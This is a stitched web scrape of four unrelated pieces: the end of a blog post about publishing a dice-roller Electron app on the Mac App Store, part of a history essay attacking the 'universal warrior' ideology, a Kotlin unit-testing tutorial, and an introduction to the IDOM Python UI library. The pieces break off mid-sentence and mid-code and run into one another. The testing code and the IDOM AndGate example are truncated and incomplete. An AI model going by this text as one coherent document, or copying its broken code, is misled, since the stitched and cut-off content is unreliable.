<p>CSS is pretty amazing these days, but I went with <a href="https://sass-lang.com/">Sass</a> out of complacency or momentum or whatever you want to call it. I processed all the styles and scripts with <a href="https://laravel-mix.com/">Laravel Mix</a> which is a pretty great way to use <a href="https://webpack.js.org/">webpack</a> when you don’t feel like learning about webpack<sup id="fnref-516-mix"><a href="#fn-516-mix">2</a></sup>.</p>
<h2>Leaving behind <code>localStorage</code></h2>
<p>I have a bad habit of using <code>localStorage</code>, <a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/localStorage">web storage feature</a>, for everything. In d20 v2 I was saving all the presets in <code>localStorage</code>. But for v3 I moved to using a JSON file for saving presets and settings information. This is my first time using the file system in an Electron app so here’s hoping I did all of the Apple security stuff right.</p>
<p>The cool thing about this though is that it’s now much easier to back up your presets, move them to another machine, or share them with others. Just save the file. Boom. Easy. I will be able to rest easier knowing that I have reliable, persistent storage and that a user won’t wake up one day to find their data missing.</p>
<h2>Design</h2>
<p>These three images should give you an idea about the progression of UI design. Of course, I feel that the third version is far superior. I do think it’s funny how my color scheme seems to be trending pink-ward.</p>

<p>I take the UI design seriously and the lack of nicely designed dice rollers on the Mac App Store was a big reason I made d20 originally. I’m pretty happy with how it turned out and I’m hoping to start getting sales information from Apple really soon to find out whether users agree.</p>
<h2>Problems and solutions</h2>
<p>I said earlier that I was beginning to run up against problems in v2. Many of those I have addressed in v3.</p>
<p>One of the major ones is what I’m calling “multi-roll.” The easiest way to describe this is that it lets you roll attack and damage at the same time. Technically, what it is doing is letting you separate different formulas with a comma but roll them at the same time. This means that you can also <em>save</em> them together, which means that now you can have a weapon as a preset button and clicking will roll the attack and the damage simultaneously, with each having its own result entry.</p>
<p>Another big problem was that v2 presets were simplistic—just a list of buttons that each can roll one combo. If you have multiple characters, good luck rummaging through all your presets to find the ones you need.</p>
<p>I’m tackling this in v3 by introducing the concept of “preset groups,” which let you create different lists of presets (e.g., one per character). This plus multi-roll solve the biggest annoyances I had with v2.</p>
<h2>Submitting to the Mac App Store is hard</h2>
<p>Seriously, that was harder than building the app. There are a lot of articles recommending <code>electron-forge</code> but there’s not much help out there about what happens when something doesn’t work.</p>
<p>I ended up using its parts directly: <code>electron-packager</code>, <code>electron-osx-sign</code>, and <code>electron-osx-flat</code>. This topic deserves its own article probably but in summary:</p>
<ul>
<li>You need a “Mac App Distribution” certificate from Apple.</li>
<li>You need a “provisioning profile” from Apple.</li>
<li>You need the entitlements files—I just grab these off of the <a href="https://www.electronjs.org/docs/tutorial/mac-app-store-submission-guide">Electron site</a>, but if the app needs any special entitlements, you have to add those. For example: <code>com.apple.security.network.client</code> if your app needs to hit the web for stuff.</li>
<li>You need to package the app with <code>electron-packager</code>, which requires you have the aforementioned Apple cert installed onto your keychain.</li>
<li>You need to sign the app with <code>electron-osx-sign</code>.</li>
<li>You need to turn the <code>.app</code> into an installer with <code>electron-osx-flat</code>.</li>
<li>You need to send the resulting installer to Apple using their app called Transporter.</li>
</ul>
<p>Here are the three npm scripts I used to package, sign, and prep the installer for distribution on the Mac App Store:</p>
<pre><code>{
  "scripts": {
    "package": "electron-packager . d20 --out=out --platform=mas --arch=x64 --appBundleId=com.example.app_name --icon=./images/d20_icon --no-deref-symlinks --overwrite",
    "sign:mas": "electron-osx-sign out/d20-mas-x64/d20.app --entitlements=entitlements/parent.plist --entitlements-inherit=entitlements/child.plist --entitlements-loginhelper=entitlements/loginhelper.plist",
    "installer": "electron-osx-flat out/d20-mas-x64/d20.app --platform=mas"
  }
}
</code></pre>
<p>These resources helped me out a lot:</p>
<ul>
<li><a href="https://www.electronjs.org/docs/tutorial/mac-app-store-submission-guide">https://www.electronjs.org/docs/tutorial/mac-app-store-submission-guide</a></li>
<li><a href="https://epxx.co/artigos/electronsign.html">https://epxx.co/artigos/electronsign.html</a></li>
<li><a href="https://github.com/electron/electron-packager">electron-packager</a></li>
<li><a href="https://github.com/electron/electron-osx-sign">electron-osx-sign</a></li>
</ul>
<h2>Web vs app stores</h2>
<p>To be honest, I would have loved to just deploy d20 as a web app. But unfortunately it’s hard to get traffic to a web app versus getting the built-in audience an app store provides. It’s one thing to charge for a Mac app, but try to charge for a website that rolls dice and suddenly it seems ridiculous. I don’t know if there’s an app-store-like website for distributing web apps (<a href="https://itch.io/">itch.io</a> maybe?) but I doubt a web version would have had the same success (10-20 copies sold per month) that the Mac App Store provides with $0 of marketing effort.</p>
<p>It’s a technical challenge building an Electron version and a web version from the same codebase, but providing some kind of web version is on my radar. As much as I would love to go cross-platform and distribute Windows and Linux versions, I don’t have a good way to test those platforms. And my specific setup for working on my Mac (which I need thanks to my disability) isn’t conducive to OS or device switching. But at least providing a web version would open it up to more platforms.</p>
<h2>By the numbers</h2>
<p>In conclusion, here are some random stats/numbers for your amusement.</p>
<ul>
<li><strong>3.5</strong> years on the Mac App Store</li>
<li><strong>203</strong> commits across all versions</li>
<li><strong>d1,000,000:</strong> the largest die d20 v3 can roll</li>
<li><strong>100:</strong> number of random integers d20 requests from RANDOM.ORG when you roll a die</li>
<li><strong>$3.99:</strong> the price of d20 v1</li>
<li><strong>04/2020:</strong> highest grossing month ($200)</li>
<li><strong>$3.41k</strong> in lifetime total sales (before Apple’s cut)</li>
</ul>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>This is the third and final part of a discussion (<a href="https://acoup.blog/2021/01/29/collections-the-universal-warrior-part-i-soldiers-warriors-and/">I</a>, <a href="https://acoup.blog/2021/02/05/collections-the-universal-warrior-part-iia-the-many-faces-of-battle/">IIa</a>, <a href="https://acoup.blog/2021/02/12/collections-the-universal-warrior-part-iib-a-soldiers-lot/">IIb</a>) discussion of the notion that there is a ‘universal warrior’ – a transcendent sameness about either the experience of war or ‘warrior values’ which might provide some sort of useful blueprint for life generally or some sort of fundamental truth about the experience of war.</p>



<p>Over the last three weeks, we’ve looked at the historical evidence to see if there was any hint of some universal war experience or set of warrior values.  What we’ve found instead is that almost everything about how humans engage in war, aside from the fact that they do so, varies tremendously from one culture to the next, from one place to the next, from one period to the next.  Cultural expectations, social values, technological conditions, entire systems of warfare and simple circumstance also condition the experience of war and the values that combatants have in extreme ways which render the search for a ‘universal’ set of warrior values a clearly doomed enterprise.</p>



<p>But, as laid out in the beginning, the ‘universal warrior’ wasn’t merely a (deeply flawed) argument about the structure and experiences of the past, but the foundation stone in an ideological blueprint for living one’s modern life.  And so it is time now that we turn from the (quite bad) historical roots of this idea to the (worse, it turns out) ideological implications of the idea.</p>



<p>But first, as always, if you like what you are reading here, please share it; if you really like it, you can support me on <a href="https://www.patreon.com/user?u=20122096">Patreon</a>. And if you want updates whenever a new post appears, you can click below for email updates or follow me on twitter (@BretDevereaux) for updates as to new posts as well as my occasional ancient history, foreign policy or military history musings.</p>






<p>(I couldn’t decide quite how I wanted to illustrate this essay and it didn’t seem like quite the right content for historical cat photos, so I’ve opted to leave it without images.  I may go back and add pictures at a later date, but for now, it can stand purely as an essay.)</p>



<h2>Once More, With Feeling</h2>



<p>In a sense, while the previous three posts have been fun, they were really just a very long preamble to the argument I am making here, so I want to both lay out <em>why</em> I opened with a three-week long preamble before getting to the point (‘how else would you know it was me?’) and also pull together the conclusions from all of that before we move forward.</p>



<p>So why the preamble?  Because I wanted to make sure before we started discussing the underlying ideology that lurks <em>behind</em> claims of the universality of some ‘warrior ethos’ we had defused the retort that, whatever the unpleasant implications, the ‘universal warrior’ was <em>historically true</em>.  This had to be done first because <strong>I am of the opinion that</strong> <strong>truth is an absolute defense</strong> in such matters; the universe contains a great many facts which are frustratingly inconvenient, yet as historians we have to deal with the world as it is rather than as we wish it to be (or wish it to have been).  Consequently, before I could complain about the ideology, it was necessary to determine if the historical theory was true, or even remotely plausible.</p>



<p>So we have spent three weeks hunting for the ‘universal warrior’ – either in the form of a universal war <em>experience</em> or a universal set of <em>values</em>.  What we have found is:</p>



<ul><li>Far from there being one set way that combatants relate to their society, soldiers, warriors and civilians represent distinct categories defined by how people in war relate to their society.  Even <em>within</em> those categories, variety is considerable, leaving no one clear model of how combatants relate to their societies.</li><li>Moreover, war itself is changeable, moving through at least three (and probably four) distinct systems of land warfare alone, each with substantial differences in tactics, values, and experiences.</li><li>Moreover, different cultures understand and imagine the ideal qualities of combatants differently, often so dramatically differently that one culture’s definition of courage is not merely different from an other’s, but diametrically opposed.</li><li>Moreover, the actual experience of battle – we discussed this mostly through the experience of fear – isn’t universal either.  The fear of facing a cavalry charge is not the same sort of fear as the fear of enduring a week long artillery barrage, while ‘war is scary’ in a general sense is hardly enough to set off the warrior or the soldier from any number of other scary and potentially hazardous jobs.</li><li>Moreover, the bonds of comradeship that support modern cohesion (often cited as a unique and universal experience) are, in fact, also historically contingent, both in that there are many systems for generating cohesion, not all of which involve tight bonds formed during military service and that some military systems don’t seek to develop cohesion in this sense at all.</li><li>Moreover, attitudes towards the hardships of war <em>also</em> vary wildly, as do the actual hardships in question.</li><li>Moreover, not only do different societies express different attitudes and values towards the wounded, but the nature of the wounds themselves has changed over time as military technology has become progressively more lethal; both states that apply not only to physical, but also mental wounding.</li></ul>



<p>In short, while there is enough commonality in war to suggest a definition that encompasses the idea (again, I rather prefer W. Lee’s definition of war as “organized group activity, conducted with lethal effects, that diminishes one [unconsenting] group for the benefit of another”), <em>within </em>that definition, <strong>there is far too much variety to suggest there is any one ‘universal’ experience of war or any one set of universal warrior values</strong>.</p>



<p>And I should note this is something we could demonstrate in more than a half-dozen different ways deploying just a fraction of the available scholarship on how the experience and values of war change from place to place.  Indeed, that is essentially what we have done.  <strong>Any <em>one</em> of the above points is enough to be fatal to the notion that there is some sort of ‘universal’ set of warriors values and experiences </strong>such that, as Pressfield openly states, a Spartiate could be simply dropped into a modern U.S. Marine regiment and fit in without skipping a beat (or his equally anachronistic notion that the decadent Athenian could be dropped into American civil society and also integrate seamlessly).  </p>



<p>But of course Pressfield isn’t offering a <em>history</em> (and indeed, he has not written one), he is offering an ideology and (intentionally or not) reshaping the historical facts to fit that ideology, shaving the corners off of the square peg so it will fit into the round hole of his moral assumptions.  His ideology requires a universal set of warrior values to serve as the foundation for his life philosophy and so, facts be damned, he <em>will</em> assert the existence of such a universal set of values.  The ideology, not the history, is the foundation, which is why Pressfield offers both anecdotes from Plutarch (a historical source) and his own books (modern historical fiction) as having equal truth value, even though the latter has no value as historical evidence; they both <strong>express the ideology</strong>.</p>



<p>So what is the ideology here?  Well, for that it is time to meet our old friend…</p>



<h2>The Cult of the Badass</h2>



<p>Pulling out the core ideology from Pressfield’s <a href="https://stevenpressfield.com/category/the-warrior-archetype/">videos </a>is a formidable task; there are fifty of them and so much of the core argument is submerged beneath endless anecdotes (some historical, some Pressfield openly invented for his historical fiction; all delivered with insufficient historical context).  But Pressfield’s videos are useful for this argument because he makes explicit a set of arguments which are usually only made <em>implicitly</em> through a set of emotional appeals which often are carried through the subtext of images and references rather than the text of what is being said.</p>



<p>(Marching through Pressfield’s videos was also frankly difficult because there are <a href="https://twitter.com/BretDevereaux/status/1350655580562731011"><em>just so many errors</em> </a>in them, I had to stop live-tweeting my way through them because if I kept doing it I’d never finish.  As a reminder, this is a fellow whose fiction<a href="https://en.wikipedia.org/wiki/Gates_of_Fire"> is on reading lists </a>at various U.S. military officer training programs, much to my continued sorrow.)</p>



<p>We may, I think, summarize Pressfield’s core argument as follows: the ‘warrior archetype’ (he is using here the long-abandoned psychology of Carl Jung) represents a true human universal best understood by certain ‘warrior societies’ (<em>especially</em> the Spartans, but also Alexander III, but somehow <em>not</em> the Macedonians or Philip II) who supposedly demonstrated martial excellence and who therefore are “representative of the purest expression of the warrior archetype” (his words).  Moreover, Pressfield argues that this understanding of the ‘inner warrior’ provides the best blueprint on which a person might fashion their lives, understanding their weaknesses as an ‘inner enemy’ that must be opposed by ‘warrior values’ and ‘mental toughness.’  And while Pressfield will admit that the ‘warrior archetype’ can go astray (he says this of Alexander, though I’d argue that Alexander didn’t so much ‘go astray’ as he ‘kept doing what he had done literally for his entire life, but began doing it to people who thought Alexander would only hurt people <em>they didn’t like</em>‘), he nevertheless presents this ‘warrior archetype’ as an expression of the highest possible human ideal.  <strong>In Pressfield’s ideological framework, it is the great warriors – the Spartans, Alexander, Arjuna – who stand atop the summit of human physical and moral achievement.</strong>  Non-warriors (mostly women) are valued in as much as they uphold elements of this warrior ideal so that warriors (mostly men) can give those ideals physical expression in action.  Even internal struggles must be reframed as a form of war, to be fought and defeated with the same values that best produce effective real-world violence.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>I often see unit testing completely overlooked until after code is written, and I have been hugely guilty of this in the past. Testing can sometimes be seen as taking longer, doesn’t add perceived value, or it’s too complicated. I’m going to try and change those perceptions, to help you or others around you see why tests are just as important as the code itself!</p>

<p>There are many reasons why you should test your code, and all of them will help <strong>you!</strong> Unit testing your code is not to satisfy some code coverage statistic, it is a tool to do the following:</p>
<h2 id="1-it-proves-your-code-works-as-intended-">1. it proves your code works as intended 🎉</h2>
<p>It is easy to write a block of code making a slight logic error no matter how good you think your code looks, perhaps an accidental inversion of logic (<code>==</code> instead of <code>!=</code>), forgetting a <code>null</code> check, or just being under a time pressure. It happens to everyone, so testing your code will save self-embarrassment, and catch issues before your code makes it anywhere near production.</p>
<p>Well tested code will prove each path through your code, and ensure you get the expected output for a given input.</p>
<h2 id="2-it-stops-unintended-behaviour-changes-">2. it stops unintended behaviour changes 🔥</h2>
<p>In as little as a weeks time you will have probably moved onto something else, and the code you’ve just written will be out of your mind. Without tests in place, you or someone else could make a change which breaks the original intention of the code without realising. If you’re lucky maybe a tester or QA check will spot the behaviour change, but more than likely it will slip into production code and become a bug.</p>
<p>Well tested code will ensure the behaviour and original intention of the code remains in place, until you choose to change the tests and therefore intentionally change the behaviour.</p>
<h2 id="3-it-documents-your-code-">3. it documents your code 📖</h2>
<p>After a certain amount of time your memory will fade and you’ll forget the original reason for various parts of your code. One day you or a colleague may want to use or tweak the code, but not quite understanding the original reasoning.</p>
<p>Well written tests will act as a document of why the code does what it does, or why it provides a certain output.</p>
<h2 id="4-it-saves-you-time-">4. it saves you time ⌚</h2>
<p>No really… so often we think that writing tests adds a lot of time and if we just skip them we can deliver things faster. Stop for a minute and consider all the things that you do whilst writing new feature X, perhaps you build some UI, write some code to fetch some data, render the data in the UI, build the app, start tapping buttons and manually testing it does what you needed. Great you’ve built your new feature, what’s next? Perhaps you’ve covered all the scenarios in your manual test, but what usually happens is that you test the happy path where not a lot goes wrong, and you forgot to test with WiFi switched off, or with a slow connection, etc. Then next week when you build feature Y, will you go through all that manual testing again for feature X, of course not as there won’t be much time for coding soon!</p>
<p>So well written tests will save you time, sanity, and as the next point will demonstrate will free your mind to create better code.</p>
<h2 id="5-it-frees-your-mind-">5. it frees your mind 🧠</h2>
<p>When building a simple application by yourself you can sometimes maintain the whole picture of what the app does, and how everything touches and affects each other. But once someone else is working on the same codebase, or the codebase becomes too large, it’s harder and harder to maintain the whole picture.</p>
<p>Well written tests can be run at anytime to prove that your code behaves as intended and hasn’t been accidentally broken by a change somewhere else in the code, freeing your mind to concentrate on just the unit of code your are working on, safe in the knowledge you aren’t breaking anything else.</p>
<h2 id="6-it-makes-you-a-better-programmer-">6. it makes you a better programmer 🌟</h2>
<p>Seriously, if you want to be a better programmer, get better results, less bugs, more “it just works” moments, then start writing tests that give you even more confidence in your code, and once you treat tests as first class citizens among your codebase, you immediately level-up as a programmer!</p>
<h2 id="7-it-is-fun-">7. it is fun! 😀</h2>
<p>You probably became a programmer because you enjoy creating apps or programs with all the challenges that brings, and tests are just programs, so if you like programming, you should like writing tests! They’re written in the same language, come with great tools, and can be challenging to write.</p>
<p>There is also a huge sense of satisfaction when you write a test that catches a problem you hadn’t spotted or intended.</p>
<hr>

<p>Quite simply, you should test everything where possible. There’s no good reason to think that some parts of your code are ineligible for testing, and where there is a will there is a way.</p>
<h2 id="types-of-output-to-test">Types of output to test</h2>
<p>There are 2 types of output that you need to prove in your tests:</p>
<h3 id="1-asserting-the-return-value-of-a-function">1. asserting the return value of a function</h3>
<p>When your function returns a value then you <strong>MUST</strong> assert that it is the expected value.</p>
<div><pre><code data-lang="kotlin"><span>class</span> <span>Calculator</span>() {

  <span>fun</span> <span>multiply</span>(a: Int, b: Int) = a * b
}
</code></pre></div><div><pre><code data-lang="kotlin"><span>class</span> <span>CalculatorTests</span> {

  <span>@Test</span> <span>fun</span> <span>`multiply should return 4 when a = 2, b = 2`</span>() {
    <span>val</span> result = Calculator().multiply(<span>2</span>, <span>2</span>)
    assertEquals(<span>4</span>, result)
  }

  <span>@Test</span> <span>fun</span> <span>`multiply should return 32 when a = 8, b = 4`</span>() {
    <span>val</span> result = Calculator().multiply(<span>8</span>, <span>4</span>)
    assertEquals(<span>32</span>, result)
  }
}
</code></pre></div><p>These tests assert that the result is correct given the different arguments, ensuring the calculation is working as expected.</p>
<h3 id="2-verifying-calls-to-external-dependency-functions">2. verifying calls to external dependency functions</h3>
<p>When your function calls another function on a dependency then you <strong>SHOULD</strong> verify that it’s been called with the expected arguments.</p>
<div><pre><code data-lang="kotlin"><span>class</span> <span>Calculator</span>(
  <span>private</span> <span>val</span> piProvider: PiProvider
) {

  <span>fun</span> <span>piTo10Places</span>() = piProvider.generate(decimalPlaces = <span>10</span>)
}
</code></pre></div><div><pre><code data-lang="kotlin"><span>class</span> <span>CalculatorTests</span> {

  <span>private</span> <span>lateinit</span> <span>var</span> mockPiProvider: PiProvider

  <span>@Before</span> <span>fun</span> <span>setUp</span>() {
    <span>// stub the generate function to return the correct value
</span><span></span>    every { mockPiProvider.generate(decimalPlaces = <span>10</span>) } returns <span>3.1415926535</span>
  }

  <span>@Test</span> <span>fun</span> <span>`piTo10Places should generate pi to 10 places`</span>() {
    <span>val</span> result = Calculator(mockPiProvider).piTo10Places()
    <span>// assert result is the expected value
</span><span></span>    assertEquals(<span>3.1415926535</span>, result)
    
    <span>// verify our mock was called with the right argument of 10
</span><span></span>    verify { mockPiProvider.generate(decimalPlaces = eq(<span>10</span>)) }
  }
}
</code></pre></div><p>This test verifies the call to the dependency has been called with the correct arguments and ensures the behaviour is expected.</p>
<h3 id="or-a-combination-of-both">or a combination of both</h3>
<p>In reality your functions will probably be a little more complex (but not too much, remember KISS and SRP principles) than those examples and there may be a little more to assert and verify. Often you’ll want to use a combination of assertions and verifications, but try to keep your test structured like this.</p>
<div><pre><code data-lang="kotlin"><span>@Test</span> <span>fun</span> <span>`example test`</span>() {
  <span>// setup stubs and mocks where needed
</span><span></span>
  <span>// call the function under test
</span><span></span>
  <span>// assert the results and verify the calls
</span><span></span>}
</code></pre></div><hr>

<p>The key to testing successfully is to have a testing mindset, by this I mean you should have testing on your mind whenever thinking about, planning, or writing code. The more you write tests, the more this will happen naturally, so don’t worry if it’s hard to start with.</p>
<h2 id="imagine-or-actually-write-down-all-the-outcomes">Imagine (or actually write down) all the outcomes</h2>
<p>When you’re starting out creating a function or class, it helps to imagine or actually create some blank test scenarios for each outcome you want to achieve.</p>
<h3 id="item-repository">Item Repository</h3>
<p>Let’s say we need to create a repository to get some imaginary items, we know we need to get lists of items to display a list view, individual items by their ID for a detailed view of the item, and we’d like to cache them in to speed up fetching them next time.</p>
<p>So let’s write some quick test cases down of the various scenarios or outcomes that could happen. Now this doesn’t have to cover absolutely everything, as we might want to add some extra coverage once we get into the implementation later.</p>
<div><pre><code data-lang="kotlin"><span>class</span> <span>ItemRepositoryTests</span> {

  <span>@Test</span> <span>fun</span> <span>`findAll should return items from API and store in cache when not cached`</span>() {}
  <span>@Test</span> <span>fun</span> <span>`findAll should return items from cache when already cached`</span>() {}
  <span>@Test</span> <span>fun</span> <span>`findAll should return empty list when not available in cache or API`</span>() {}

  <span>@Test</span> <span>fun</span> <span>`findById should return item from API and store in cache when not cached`</span>() {}
  <span>@Test</span> <span>fun</span> <span>`findById should return item from cache when already cached`</span>() {}
  <span>@Test</span> <span>fun</span> <span>`findById should return null when not available in cache or API`</span>() {}
}
</code></pre></div><p>As you can see, the tests are doing nothing right now, but we have detailed what we expect to happen in the different scenarios, so now we can start implementing a class to achieve those scenarios.</p>
<div><pre><code data-lang="kotlin"><span>class</span> <span>ItemRepository</span>(
  <span>private</span> <span>val</span> api: ItemApi,
  <span>private</span> <span>val</span> cache: ItemCache,
) {

  <span>fun</span> <span>findAll</span>(): List&lt;Item&gt; =
    cache.all() <span>?:</span> api.all()<span>?.</span>also { cache.putAll(<span>it</span>) } <span>?:</span> emptyList()
  
  <span>fun</span> <span>findById</span>(id: String): Item? =
    cache.findById(id) <span>?:</span> api.findById(id)<span>?.</span>also { cache.put(<span>it</span>) }
}
</code></pre></div><p>With some creative use of the <code>?:</code> elvis operator and the <code>also</code> scope function we can make it a one liner, but it’s definitely in need of some actual tests to prove this works correctly.</p>
<div><pre><code data-lang="kotlin"><span>class</span> <span>ItemRepositoryTests</span> {

  <span>@Mock</span> <span>private</span> <span>lateinit</span> <span>var</span> api: ItemApi
  <span>@Mock</span> <span>private</span> <span>lateinit</span> <span>var</span> cache: ItemCache
  
  <span>private</span> <span>lateinit</span> <span>var</span> repo: ItemRepository

  <span>@Before</span> <span>fun</span> <span>setUp</span>() {
    repo = ItemRepository(api, cache)
  }

  <span>@Test</span> <span>fun</span> <span>`findAll should return items from API and store in cache when not cached`</span>() {
    <span>val</span> itemList = listOf(item1, item2)
    every { api.all() } returns itemList
    every { cache.all() } returns <span>null</span>

    <span>val</span> result = repo.findAll()

    assertSame(itemList, result)

    verifySequence {
      cache.all()
      api.all()
      cache.putAll(itemList)
    }
  }

  <span>@Test</span> <span>fun</span> <span>`findAll should return items from cache when already cached`</span>() {
    <span>val</span> itemList = listOf(item1, item2)
    <span>val</span> cachedItemList = listOf(cachedItem1, cachedItem2)
    every { api.all() } returns itemList
    every { cache.all() } returns cachedItemList

<p>IDOM takes inspiration from <a href="https://reactjs.org/" target="_blank">React</a>, and wherever
possible, attempts to achieve parity with the features it copies more directly. Nowhere
is this more evident than the version of React's often lauded
<a href="https://reactjs.org/docs/hooks-intro.html" target="_blank">"Hooks"</a> that IDOM
implements in Python.</p>
<p>At a glance, the similarities between IDOM and React are rather striking. Below is a
React component which defines a simple <code>Counter</code> displaying the number of times a button
has been clicked:</p>
<div><pre><span></span><code><span>import</span> <span>React</span><span>,</span> <span>{</span> <span>useState</span> <span>}</span> <span>from</span> <span>"react"</span><span>;</span>
<span>import</span> <span>ReactDOM</span> <span>from</span> <span>"react-dom"</span><span>;</span>

<span>function</span> <span>Counter</span><span>()</span> <span>{</span>
  <span>const</span> <span>[</span><span>count</span><span>,</span> <span>setCount</span><span>]</span> <span>=</span> <span>useState</span><span>(</span><span>0</span><span>);</span>
  <span>return</span> <span>(</span>
    <span>&lt;</span><span>div</span><span>&gt;</span>
      <span>&lt;</span><span>button</span> <span>onClick</span><span>=</span><span>{()</span> <span>=&gt;</span> <span>setCount</span><span>(</span><span>count</span> <span>+</span> <span>1</span><span>)}&gt;</span><span>Click</span> <span>me</span><span>!</span><span>&lt;/</span><span>button</span><span>&gt;</span>
      <span>&lt;</span><span>p</span><span>&gt;{</span><span>`Click count: </span><span>${</span><span>count</span><span>}</span><span>`</span><span>}&lt;/</span><span>p</span><span>&gt;</span>
    <span>&lt;/</span><span>div</span><span>&gt;</span>
  <span>);</span>
<span>}</span>

<span>ReactDOM</span><span>.</span><span>render</span><span>(&lt;</span><span>Counter</span> <span>/&gt;,</span> <span>document</span><span>.</span><span>getElementById</span><span>(</span><span>"root"</span><span>));</span>
</code></pre></div>

<p>And this is the same component implemented in Python using IDOM:</p>
<div><pre><span></span><code><span>import</span> <span>idom</span>

<span>@idom</span><span>.</span><span>component</span>
<span>def</span> <span>Counter</span><span>():</span>
    <span>count</span><span>,</span> <span>set_count</span> <span>=</span> <span>idom</span><span>.</span><span>hooks</span><span>.</span><span>use_state</span><span>(</span><span>0</span><span>)</span>
    <span>return</span> <span>idom</span><span>.</span><span>html</span><span>.</span><span>div</span><span>(</span>
        <span>idom</span><span>.</span><span>html</span><span>.</span><span>button</span><span>(</span>
            <span>{</span><span>"onClick"</span><span>:</span> <span>lambda</span> <span>event</span><span>:</span> <span>set_count</span><span>(</span><span>count</span> <span>+</span> <span>1</span><span>)},</span>
            <span>"Click me!"</span>
        <span>),</span>
        <span>idom</span><span>.</span><span>html</span><span>.</span><span>p</span><span>(</span><span>f</span><span>"Click count: </span><span>{</span><span>count</span><span>}</span><span>"</span><span>)</span>
    <span>)</span>

<span>idom</span><span>.</span><span>run</span><span>(</span><span>Counter</span><span>)</span>
</code></pre></div>

<p>Which, when displayed in your browser, should look something like this:</p>

<h2 id="why-do-we-need-idom">Why Do We Need IDOM?</h2>
<p>Over the <a href="https://www.npmtrends.com/react-vs-angular-vs-vue" target="_blank">past 5
years</a> front-end
developers seem to have concluded that programs written with a
<a href="https://www.youtube.com/watch?v=yGh0bjzj4IQ" target="_blank">declarative</a> style or
framework tend to be easier to understand and maintain than those done imperatively. Put
more simply, mutable state in programs can quickly lead to unsustainable complexity.
This trend is largely evidenced by the
<a href="https://gist.github.com/tkrotoff/b1caa4c3a185629299ec234d2314e190" target="_blank">rise</a>
of Javascript frameworks like <a href="https://vuejs.org/" target="_blank">Vue</a> and
<a href="https://reactjs.org/" target="_blank">React</a> which describe the logic of computations
without explicitly stating their control flow.</p>
<p><img alt="npm download trends" src="https://rmorshea.github.io/articles/2021/idom-react-but-its-python/npm-download-trends.png"></p>
<p>So what does this have to do with Python and IDOM? Well, because browsers are the de
facto "operating system of the internet", even back-end languages like Python have had
to figure out clever ways to integrate with them. While standard
<a href="https://en.wikipedia.org/wiki/Representational_state_transfer">REST</a> APIs are well
suited to applications built using HTML templates, modern browser users expect a higher
degree of interactivity than this alone can achieve.</p>
<p>A variety of Python packages have since been created to help solve this problem:</p>
<ul>
<li><a href="https://github.com/jupyter-widgets/ipywidgets" target="_blank">IPyWidgets</a> - Adds
  interactive widgets to <a href="https://jupyter.org/" target="_blank">Jupyter Notebooks</a></li>
<li><a href="https://plotly.com/dash/" target="_blank">Dash</a> - Allows data scientists to produces
  enterprise-ready analytic apps</li>
<li><a href="https://www.streamlit.io/" target="_blank">Streamlit</a> - Turns simple Python scripts
  into interactive dashboards</li>
<li><a href="https://docs.bokeh.org/" target="_blank">Bokeh</a> - An interactive visualization
  library for modern web browsers</li>
</ul>
<p>However they each have drawbacks that can make them difficult to use.</p>
<ol>
<li>
<p><strong>Restrictive ecosystems</strong> - UI components developed for one framework cannot be
   easily ported to any of the others because their APIs are either too complex,
   undocumented, or are structurally inaccesible.</p>
</li>
<li>
<p><strong>Imperative paradigm</strong> - IPyWidgets and Bokeh have not embraced the same declarative
   design principles pioneered by front-end developers. Streamlit and Dash on the
   otherhand, are declarative, but fall short of the features provided by React or Vue.</p>
</li>
<li>
<p><strong>Limited layouts</strong> - At their initial inception, the developers of these libraries
   were driven by the visualization needs of data scientists so the ability to create
   complex UI layouts may not have been a primary engineering goal.</p>
</li>
</ol>
<p>A future article will address specific comparisons to each of the projects mentioned
above, but for now, we'll just focus on IDOM and its solutions to these problems.</p>
<h2 id="ecosystem-independence">Ecosystem Independence</h2>
<p>IDOM has a flexible set of core abstractions that allow it to interface with its peers.
At the time of writing, both Jupyter and Dash are supported, while Streamlit and Bokeh
are in the works:</p>
<ul>
<li><a href="https://github.com/idom-team/idom-jupyter" target="_blank">idom-jupyter</a> (try it now
  with
  <a href="https://mybinder.org/v2/gh/idom-team/idom-jupyter/main?filepath=notebooks%2Fintroduction.ipynb" target="_blank">Binder</a>)</li>
<li><a href="https://github.com/idom-team/idom-dash" target="_blank">idom-dash</a></li>
</ul>
<p>By providing well defined interfaces and straighforward protocols, IDOM makes it easy to
swap out any part of the stack with an alternate implementation if you want to. For
example, if you need a different web server for your application, IDOM already has 3
options to choose from or, use as blueprints to create your own:</p>
<ul>
<li><a href="https://github.com/sanic-org/sanic" target="_blank">Sanic</a></li>
<li><a href="https://github.com/pallets/flask" target="_blank">Flask</a></li>
<li><a href="https://github.com/tornadoweb/tornado" target="_blank">Tornado</a></li>
</ul>
<p>You can even target your usage of IDOM in your production-grade applications with IDOM's
Javascript <a href="https://github.com/idom-team/idom-client-react" target="_blank">React client library</a>. Just install
it in your front-end app and connect to a back-end websocket that's serving up IDOM
models. IDOM's own
<a href="https://idom-docs.herokuapp.com/docs/index.html" target="_blank">documentation</a> acts as
a prime example for this targeted usage - most of the page is static HTML, but embedded
in it are interactive examples that feature live views being served from a web socket:</p>

<h2 id="declarative-components">Declarative Components</h2>
<p>IDOM, by adopting the hook design pattern from React, inherits many of its aesthetic and
functional characteristics. For those unfamiliar with hooks, user interfaces are
composed of basic <a href="https://en.wikipedia.org/wiki/HTML_element" target="_blank">HTML elements</a> that are
constructed and returned by special functions called "components". Then, through the
magic of hooks, those component functions can be made to have state. Consider the
component below which displays a basic representation of an
<a href="https://en.wikipedia.org/wiki/AND_gate" target="_blank">AND-gate</a>:</p>
<div><pre><span></span><code><span>import</span> <span>idom</span>

    <span>)</span>

<span>idom</span><span>.</span><span>run</span><span>(</span><span>AndGate</span><span>)</span>
</code></pre></div>

<p><img alt="and-gate-demo" src="https://rmorshea.github.io/articles/2021/idom-react-but-its-python/and-gate.gif"></p>
<p>Here's a very high level summary of how it works... the first time a view of the
component above is rendered, the <code>AndGate</code> function is called where its initial <code>state</code>
for <code>input_1</code> and <code>input_2</code> is <code>False</code>. The function then returns a series of HTML
elements with callbacks that respond to client-side events. Machinery behind the scenes
subsequently realizes that declaration and displays two checkbox buttons with the text
<code>False AND False = False</code>. Later, when a user clicks the now visible checkbox buttons,
client-side events are triggered, the associated callbacks respond by inverting the old
